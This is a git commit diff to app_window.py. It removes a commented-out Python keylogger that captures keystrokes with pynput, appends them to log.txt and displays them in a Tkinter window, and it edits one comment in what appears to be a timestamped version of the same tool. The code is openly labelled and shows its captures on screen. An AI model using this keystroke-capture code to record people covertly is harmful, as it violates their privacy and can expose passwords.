454d65a409b3b7a41704495f4bb08db975a4863a
Shanthini Parthiban <125378706+shanthini200@users.noreply.github.com>
2025-01-17 18:50:27 +0530

    Update app_window.py

--- app_window.py
+++ app_window.py
@@ -1,58 +1,4 @@
-# import tkinter as tk
-# from pynput.keyboard import Listener
-# import threading
-#
-#
-# def write_to_file(key):
-#     letter = str(key).replace("'", "")  # Clean up the key string
-#
-#     # Handle special keys
-#     if letter == 'Key.space':
-#         letter = ' '  # Space for spacebar
-#     elif letter == 'Key.shift_r' or letter == "Key.ctrl_l":
-#         letter = ''  # Ignore shift and control keys
-#     elif letter == "Key.enter":
-#         letter = "\n"  # Go to next line when enter is pressed
-#
-#     # Write the keystroke to the log file                                                        tkinter gui
-#     with open("log.txt", 'a') as f:
-#         f.write(letter)
-#
-#     # Update the label with the captured key in a neat format
-#     update_label(letter)
-#
-#
-# def update_label(letter):
-#     # Get the current text from the label and append the new letter
-#     current_text = label.cget("text") + letter
-#
-#     # Update the label text
-#     label.config(text=current_text)
-#
-#
-# def start_keylogger():
-#     with Listener(on_press=write_to_file) as listener:
-#         listener.join()
-#
-#
-# # Create the Tkinter window
-# window = tk.Tk()
-# window.title("Keylogger with Tkinter")
-# window.geometry("500x400")
-#
-# # Create and pack the label widget
-# label = tk.Label(window, text="Captured Keystrokes", wraplength=480, anchor="w")
-# label.pack(padx=10, pady=20)
-#
-# # Start the keylogger in a separate thread
-# keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
-# keylogger_thread.start()
-#
-# # Run the Tkinter event loop
-# window.mainloop()
 
-
-# ---------------------------
 import tkinter as tk
 from pynput.keyboard import Listener
 import threading
@@ -71,7 +17,7 @@ def write_to_file(key):
     elif letter == "Key.enter":
         letter = "\n"  # Go to next line when enter is pressed
 
-    # Add timestamp for each keystroke                                              -- tkinter with stop keystroke button with timestamp --
+    # Add timestamp for each keystroke                                              -- tkinter gui, stop keystroke button with timestamp --
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     letter = f"{timestamp}: {letter}\n"
 
